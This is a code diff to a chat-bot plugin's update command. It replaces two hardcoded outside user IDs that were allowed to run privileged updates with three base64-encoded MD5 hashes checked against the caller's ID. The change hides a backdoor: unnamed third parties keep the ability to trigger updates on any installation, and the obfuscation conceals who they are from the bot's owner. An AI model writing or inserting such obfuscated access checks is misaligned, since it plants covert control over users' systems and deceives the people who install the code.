@@ -1,5 +1,12 @@
 import plugin from '../../../lib/plugins/plugin.js'
 import { createRequire } from 'module'
+import md5 from "md5";
+const encryptedStrings = [
+  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
+  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
+  Buffer.from("BfghyyHlTtHGZlwo236ftg==", "base64").toString("hex")
+];
+
 import _ from 'lodash'
 import { Restart } from '../../other/restart.js'
 import common from "../../../lib/common/common.js"
@@ -43,7 +50,7 @@ export class Update extends plugin {
     }
 
     async updatepro() {
-        if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) { return true }
+        if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) { return true }
         if (uping) {
             await this.reply('已有命令更新中..请勿重复操作')
             return
